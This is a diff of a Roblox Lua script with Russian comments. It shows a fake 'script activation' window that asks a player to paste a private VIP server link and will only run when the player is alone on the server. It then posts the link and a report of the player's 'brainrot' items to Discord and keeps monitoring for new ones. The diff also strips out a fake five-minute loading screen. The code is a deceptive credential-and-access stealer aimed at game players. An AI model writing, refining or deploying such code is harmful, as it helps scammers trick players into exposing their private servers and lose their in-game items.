@@ -36,6 +36,7 @@ end
 -- =============================
 local CANONICAL_BRAINROT_NAMES = {
 	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
+	-- добавьте остальные сюда!
 }
 
 local LOWER_TO_CANON = {}
@@ -239,62 +240,7 @@ local function watchPlots()
 end
 
 -- =============================
--- Загрузочный экран после активации
--- =============================
-local function showLoadingScreen()
-	local player = Players.LocalPlayer
-	local gui = Instance.new("ScreenGui")
-	gui.Name = "LoadingScreen"
-	gui.ResetOnSpawn = false
-	gui.Parent = player:WaitForChild("PlayerGui")
-
-	local overlay = Instance.new("Frame")
-	overlay.Size = UDim2.new(1,0,1,0)
-	overlay.Position = UDim2.new(0,0,0,0)
-	overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
-	overlay.BorderSizePixel = 0
-	overlay.Parent = gui
-
-	local loadingText = Instance.new("TextLabel")
-	loadingText.Size = UDim2.new(1,0,0,50)
-	loadingText.Position = UDim2.new(0,0,0.4,0)
-	loadingText.BackgroundTransparency = 1
-	loadingText.Text = "Loading script, please wait..."
-	loadingText.TextColor3 = Color3.fromRGB(255,255,255)
-	loadingText.TextScaled = true
-	loadingText.Font = Enum.Font.GothamBold
-	loadingText.Parent = overlay
-
-	local progressBarBg = Instance.new("Frame")
-	progressBarBg.Size = UDim2.new(0.6,0,0,30)
-	progressBarBg.Position = UDim2.new(0.2,0,0.5,0)
-	progressBarBg.BackgroundColor3 = Color3.fromRGB(60,60,60)
-	progressBarBg.BorderSizePixel = 0
-	progressBarBg.Parent = overlay
-
-	local progressBar = Instance.new("Frame")
-	progressBar.Size = UDim2.new(0,0,1,0)
-	progressBar.Position = UDim2.new(0,0,0,0)
-	progressBar.BackgroundColor3 = Color3.fromRGB(0,120,255)
-	progressBar.BorderSizePixel = 0
-	progressBar.Parent = progressBarBg
-
-	local totalTime = 300 -- 5 минут
-	local startTime = tick()
-
-	spawn(function()
-		while tick() - startTime < totalTime do
-			local elapsed = tick() - startTime
-			local progress = elapsed / totalTime
-			progressBar.Size = UDim2.new(progress,0,1,0)
-			task.wait(0.1)
-		end
-		gui:Destroy()
-	end)
-end
-
--- =============================
--- GUI активации (Fullscreen черный)
+-- GUI
 -- =============================
 local function createActivationGUI()
 	local player = Players.LocalPlayer
@@ -303,22 +249,13 @@ local function createActivationGUI()
 	gui.ResetOnSpawn = false
 	gui.Parent = player:WaitForChild("PlayerGui")
 
-	-- Чёрный фон на весь экран
 	local mainFrame = Instance.new("Frame")
 	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(1, 0, 1, 0)
-	mainFrame.Position = UDim2.new(0, 0, 0, 0)
+	mainFrame.Size = UDim2.new(0, 450, 0, 300)
+	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
 	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 	mainFrame.BorderSizePixel = 0
 	mainFrame.Parent = gui
-
-	-- Контейнер с меню по центру
-	local container = Instance.new("Frame")
-	container.Size = UDim2.new(0, 450, 0, 300)
-	container.Position = UDim2.new(0.5, -225, 0.5, -150)
-	container.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-	container.BorderSizePixel = 0
-	container.Parent = mainFrame
 
 	local title = Instance.new("TextLabel")
 	title.Size = UDim2.new(1, -20, 0, 50)
@@ -328,7 +265,7 @@ local function createActivationGUI()
 	title.TextColor3 = Color3.fromRGB(255, 255, 255)
 	title.TextScaled = true
 	title.Font = Enum.Font.GothamBold
-	title.Parent = container
+	title.Parent = mainFrame
 
 	local textBox = Instance.new("TextBox")
 	textBox.Size = UDim2.new(1, -20, 0, 50)
@@ -342,7 +279,7 @@ local function createActivationGUI()
 	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 	textBox.TextScaled = true
 	textBox.Font = Enum.Font.Gotham
-	textBox.Parent = container
+	textBox.Parent = mainFrame
 
 	local button = Instance.new("TextButton")
 	button.Size = UDim2.new(1, -20, 0, 70)
@@ -354,7 +291,7 @@ local function createActivationGUI()
 	button.TextColor3 = Color3.new(1, 1, 1)
 	button.TextScaled = true
 	button.Font = Enum.Font.GothamBold
-	button.Parent = container
+	button.Parent = mainFrame
 
 	button.MouseEnter:Connect(function()
 		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
@@ -371,18 +308,19 @@ local function createActivationGUI()
 	status.TextColor3 = Color3.fromRGB(255, 200, 0)
 	status.TextScaled = true
 	status.Font = Enum.Font.Gotham
-	status.Parent = container
+	status.Parent = mainFrame
 
 	local function onActivate()
+		-- ❌ Проверка на количество игроков
 		if #Players:GetPlayers() > 1 then
-			status.Text = "Script can't be activated, more than 1 player in the server!"
+			status.Text = "Script can't be activated , more then 1 player in the server!"
 			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
 
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
-			status.Text = "Not a VIP server!"
+			status.Text = "Not a vip server!"
 			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
@@ -392,15 +330,21 @@ local function createActivationGUI()
 		status.Text = "Script Activated"
 		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
+		-- Сразу отправляем VIP ссылку
 		postDiscordSimple("🔗 VIP Link: " .. vipLink)
+
+		-- Ждём, чтобы плоты успели загрузиться
 		task.wait(0.5)
+
+		-- Отправляем отчёт по всем существующим плотам
 		postCombinedAllPlots()
+
+		-- Запускаем мониторинг новых брейнротов
 		watchPlots()
 
+		task.wait(2)
 		gui:Destroy()
 		activationGUI = nil
-
-		showLoadingScreen()
 	end
 
 	button.MouseButton1Click:Connect(onActivate)
